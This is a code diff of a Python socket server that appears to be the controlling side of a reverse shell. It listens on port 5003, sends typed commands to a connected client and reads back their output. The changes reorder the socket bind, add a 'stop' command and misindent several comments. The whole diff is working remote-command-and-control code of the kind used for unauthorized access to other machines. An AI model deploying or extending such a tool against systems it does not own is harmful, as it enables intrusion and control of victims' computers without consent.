@@ -1,4 +1,4 @@
-import socket
+import socket, os
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
@@ -8,12 +8,12 @@ SEPARATOR = "<sep>"
 
 # create a socket object
 s = socket.socket()
-
-# bind the socket to all IP addresses of this host
-s.bind((SERVER_HOST, SERVER_PORT))
 # make the PORT reusable
 # when you run the server multiple times in Linux, Address already in use error will raise
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+# bind the socket to all IP addresses of this host
+s.bind((SERVER_HOST, SERVER_PORT))
+
 s.listen(5)
 print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
@@ -29,12 +29,15 @@ while True:
     # get the command from prompt
     command = input(f"{cwd} $> ")
     if not command.strip():
-        # empty command
+    # empty command
         continue
     # send the command to the client
     client_socket.send(command.encode())
     if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
+    # if the command is exit, just break out of the loop
+        break
+    if command.lower() == "stop":
+    # if the command is exit, just break out of the loop
         break
     # retrieve command results
     output = client_socket.recv(BUFFER_SIZE).decode()
